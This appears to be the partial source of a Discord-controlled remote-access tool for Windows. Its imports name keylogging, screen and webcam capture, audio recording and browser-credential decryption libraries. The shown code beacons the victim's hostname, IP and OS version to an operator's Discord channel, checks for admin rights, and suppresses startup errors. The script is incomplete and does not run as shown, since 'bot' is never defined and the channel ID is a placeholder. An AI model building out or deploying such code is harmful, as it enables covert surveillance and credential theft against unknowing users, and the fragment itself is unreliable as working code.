import subprocess
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
from re import findall
from discord import Embed
from PIL import Image  
import screeninfo
import mss
import PIL
import os
import datetime
import tempfile
import shutil
import sys
import win32com.client
import discord
import socket
import pyautogui
import platform
import ctypes
import cv2
import requests
from discord.ext import commands
import asyncio
import time
import sounddevice as sd
import numpy as np
import wavio  # Zum Speichern von Audio
from screeninfo import get_monitors
import threading
import sqlite3
import psutil
from datetime import datetime
from pynput import keyboard
from send2trash import send2trash
from threading import Thread
from datetime import datetime
import base64
from urllib.request import Request, urlopen
import win32crypt
import apsw
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from os import getenv, listdir
import json
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
from cryptography.hazmat.backends import default_backend
from pynput import mouse, keyboard
from win32crypt import CryptUnprotectData

TOKEN = 'Your_Discord_Bot_Token'
MAX_FILE_SIZE = 7.5 * 1024 * 1024  # 7,5 MB in Bytes

locked_windows = {}
is_locked = False

def is_admin():
    """Checks if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

@bot.event
async def on_command(ctx):
    try:
        # Ausnahme für den "on_ready"-Event oder spezifische Commands
        if ctx.command and ctx.command.name == "on_ready_info":
            await bot.invoke(ctx)  # Führt den Command ohne Bestätigung aus
            return

        # Delete the original message
        await ctx.message.delete()

        # Send confirmation message
        confirmation_message = await ctx.send(
            "Are you sure you want to execute this command?"
        )
        # Add reactions
        await confirmation_message.add_reaction("✅")  # Grüner Haken
        await confirmation_message.add_reaction("❌")  # Rotes Kreuz

        # Wait for the reaction
        def check(reaction, user):
            return (
                user == ctx.author  # Nur der Autor darf reagieren
                and reaction.message.id == confirmation_message.id  # Gleiche Nachricht
                and str(reaction.emoji) in ["✅", "❌"]  # Akzeptierte Emojis
            )

        try:
            reaction, _ = await bot.wait_for("reaction_add", timeout=30.0, check=check)
        except asyncio.TimeoutError:
            await confirmation_message.delete()  # Nachricht löschen, falls keine Reaktion erfolgt
            return

        # Evaluate the reaction
        if str(reaction.emoji) == "✅":
            await confirmation_message.delete()  # Bestätigungsnachricht löschen
            await bot.invoke(ctx)  # Command ausführen
        elif str(reaction.emoji) == "❌":
            await confirmation_message.delete()  # Bestätigungsnachricht löschen
            await ctx.send("Command has been canceled.", delete_after=5)  # Info-Nachricht

    except Exception as e:
        await ctx.send(f"An error occurred: {e}", delete_after=10)

@bot.event
async def on_ready():
    local_pc_name = socket.gethostname()
    local_ip_address = socket.gethostbyname(local_pc_name)

    # Gather system information
    system_info = f"""
    **PC Name:** {local_pc_name}
    **IP Address:** {local_ip_address}
    **System:** {platform.system()} {platform.version()}
    """
    channel = bot.get_channel(Your_Channel_ID)  # Adjust: Discord channel ID

    if channel:
        await channel.send(f"The bot has started on the following system:\n{system_info}")

# Die weiteren Befehle aus Ihrer Main.py-Datei bleiben unverändert.

try:
    bot.run(TOKEN)
except Exception:
    pass